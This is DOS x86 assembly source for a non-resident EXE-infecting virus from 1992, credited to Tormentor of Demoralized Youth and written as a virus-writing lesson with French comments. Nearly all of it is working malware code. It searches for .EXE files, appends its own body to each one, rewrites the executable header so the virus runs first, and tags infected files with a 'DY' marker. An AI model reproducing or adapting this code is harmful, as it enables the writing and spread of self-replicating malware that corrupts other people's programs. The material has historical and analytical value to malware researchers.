   ;
   ;   Virus Lession #2    'How to make a non-resident EXE infector'
   ;
   ;   (c) 1992 Tormentor // Demoralized Youth

           .model  tiny   ; offre 64 Ko pour le code et les données.
           .radix  16     ; On compte en base 16 (hexa)
           .code

   Virus_Lenght    EQU Virus_End-Virus_Start       ; Variable dans laquelle on stoquera la taille du virus.

           org 100    ; Comme toujours , on commence après le PSP.

   Virus_Start:    call    where_we_are

   where_we_are:   pop si      ; On recupére le pointeur d'instruction dans SI.
                   ; (Utile pour savoir l'adresse courante quand on est attaché a un autre programme)
           sub si,where_we_are-Virus_Start ; Soustraire à SI la taille du code utilisé pour cette opération.

           mov ax,es  ; Sauvegarde le registre ES dans AX (ES et DS pointent sur le début du PSP).
           add ax,10  ; Ajoute 10 au registre afin , plus tard , de  pointer sur .
           add ax,cs:[si+Exe_header-Virus_Start+16] ; Ajoute à AX le registre SP contenu dans le header.
           push    ax     ; Met dans la pile le nombre minimum de paragraphes + offset de la pile.
           push    cs:[si+Exe_header-Virus_Start+14] ; met dans la pile le Segment de la pile.

   ; Ici , on va juste mettre le registre CS dans DS

           push    ds ; Met dans la pile le Data Segment.
           push    cs ; Met dans la pile le Code segmlent.
           pop ds ; Recuper dans "Data Segment" le code segment.

   ; Maintenant , on va repointer l'adresse DTA sur la notre.

           mov ah,1a ; Fonction "Specifier l'adresse DTA"
           mov dx,offset Own_dta-Virus_Start
           add dx,si
           int 21    ; Change l'adresse DTA vers notre nouvelle DTA.

   ; On recherche un fichier .EXE à infecter.

           mov ah,4e ; Fonction "Recherche fichier"
   look4victim:    mov dx,offset file_match-Virus_Start ; On cherche des ".EXE"
           add dx,si
           int 21

           jnc cont2
           jmp no_victim_found ; Si pas de fichier .EXE trouvé on saute vers "no_victim_found"

   ; On l'ouvre.

   cont2:      mov ax,3d02     ; Ouvrir un fichier mode 2
           mov dx,Own_dta-Virus_Start+1e
           add dx,si
           int 21

           jnc cont1
           jmp cant_open_file  ; Peut pas ouvrir l'fichier ??? :o(

   ; On lit l'en-tête.

   cont1:      xchg    ax,bx       ; File handle

           mov ah,3f       ; Lecture à partir d'un fichier.
           mov cx,1c       ; Lire 28 octets à partir du fichier.
           mov dx,offset Exe_header-Virus_Start
           add dx,si
           int 21

           jc  read_error  ; Problème de lecture ??? c'est pas mon jour ;o)

   ; On vérifi que c'est bien un fichier .EXE et qu'il n'est pas déja infecté.

           cmp byte ptr ds:[si+Exe_header-Virus_Start],'M' ; C'est bien signé MZ ?
           jnz no_exe      ; Quand ca veut pas ...
           cmp word ptr ds:[si+Exe_header-Virus_Start+12],'DY' ; Déja infecté ?
           jz  infected        ; Ben , si y à déja du monde ....

   ; On se positione à la fin du fichier hôte.

           mov ax,4202     ; Place le pointeur fichier à la fin du programme.
           xor cx,cx       ; CX=0
           xor dx,dx       ; DX=0
           int 21

           push    dx      ;
           push    ax

   ; Attache le virus au fichier hôte.

           mov ah,40       ; Attache le virus à la fin du programme hôte.
           mov cx,Virus_Lenght ; Charge la taille du virus dans CX.
           mov dx,si       ; Charge le pointeur de donnée avec SI.
           int 21

   ; On récupere la taille du fichier hôte + virus.

           mov ax,4202     ; Récuper la nouvelle taille du fichier.
           xor cx,cx
           xor dx,dx
           int 21

   ; Puis on réajuste l'en-tête.

           mov cx,200       ; Voir calcul taille fichier.
           div cx           ;      "            "
           inc ax
           mov word ptr ds:[Exe_header-Virus_Start+2+si],dx ; Taille modulo -> fichier
           mov word ptr ds:[Exe_header-Virus_Start+4+si],ax ; Taille DIV -> fichier

           pop ax
           pop dx

           mov cx,10
           div cx
           sub ax,word ptr ds:[Exe_header-Virus_Start+8+si]
           mov word ptr ds:[Exe_header-Virus_Start+16+si],ax ; Segment pile
           mov word ptr ds:[Exe_header-Virus_Start+14+si],dx ; Offset pile

           mov word ptr ds:[Exe_header-Virus_Start+12+si],'DY' ; Marque comme infecté.

           mov ax,4200     ; Positionne le pointeur de fichier vers le debut du fichier.
           xor cx,cx       ; CX=0
           xor dx,dx       ; DX=0
           int 21

           mov ah,40       ; Ecrire l'en-tête.
           mov cx,1c       ; 28 Octets lus précédement.
           mov dx,offset Exe_header-Virus_Start
           add dx,si
           int 21

           jc  write_error ; Erreur d'écriture ? c'est quoi ce bordel !

   no_exe:
   infected:
           mov ah,3e       ; Fermer le fichier.
           int 21

   Sick_or_EXE:    mov ah,4f       ; Rechercher fichier suivant.
           jmp look4victim

   write_error:        ; Here you can test whats went wrong.
   read_error:         ; This is just for debugging purpose.
   cant_open_file:     ; These entries are equal to eachother
   no_victim_found:    ; but could be changed if you need to test something.

           pop ds
           retf

   file_match  db  '*.EXE',0   ; Type du fichier à chercher.
                               ; Doit imperativement finir par 0 !

   Exe_header  db  16 DUP(0)   ;
           dw  0fff0       ; Adjustment just for this COM-file.
           db  4  DUP(0)

   notes       db  '(c) 1992 Tormentor / Demoralized Youth ',0a,0d
           db  'Rather first in hell, than second in heaven.'

   Own_Dta     db  02bh DUP(0) ; Tableau de 43 octets pour créer la DTA.

   Virus_End   EQU $

           end Virus_Start
